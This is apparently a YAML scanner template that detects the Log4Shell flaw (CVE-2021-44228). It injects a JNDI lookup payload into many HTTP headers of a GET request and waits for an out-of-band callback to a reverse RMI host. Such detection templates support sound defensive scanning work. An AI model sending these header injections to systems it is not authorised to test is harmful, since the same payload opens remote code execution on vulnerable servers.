id: VUL-2021-15790
name: CVE-2021-44228
tags:
    - Apache
    - Apache-Solr
    - JSP
    - Spring
transport: http
set:
    reverse: reverse
    reverseURL: reverse.rmi
rules:
    r0:
        request:
            cache: false
            headers:
                Accept: ${jndi:{{reverseURL}}}
                Accept-Encoding: ${jndi:{{reverseURL}}}
                Accept-Language: ${jndi:{{reverseURL}}}
                Access-Control-Request-Headers: ${jndi:{{reverseURL}}}
                Access-Control-Request-Method: ${jndi:{{reverseURL}}}
                Authentication: Basic ${jndi:{{reverseURL}}}
                Cookie: ${jndi:{{reverseURL}}}=${jndi:{{reverseURL}}}
                Location: ${jndi:{{reverseURL}}}
                Origin: ${jndi:{{reverseURL}}}
                Referer: ${jndi:{{reverseURL}}}
                Upgrade-Insecure-Requests: ${jndi:{{reverseURL}}}
                User-Agent: ${jndi:{{reverseURL}}}
                X-Api-Version: ${jndi:{{reverseURL}}}
                X-CSRF-Token: ${jndi:{{reverseURL}}}
                X-Druid-Comment: ${jndi:{{reverseURL}}}
                X-Forwarded-For: ${jndi:{{reverseURL}}}
                X-Origin: ${jndi:{{reverseURL}}}
            method: GET
            path: /
        expression: reverse.wait(5)
        output:
            reverse_url: reverseURL
expression: r0()
detail:
    fingerprint:
        softhard: ""
        product: ""
        company: ""
        category: ""
        parent_category: ""
    vulnerability:
        proof:
            info: 存在Log4j2-CVE-2021-44228 远程代码执行漏洞


reverse: true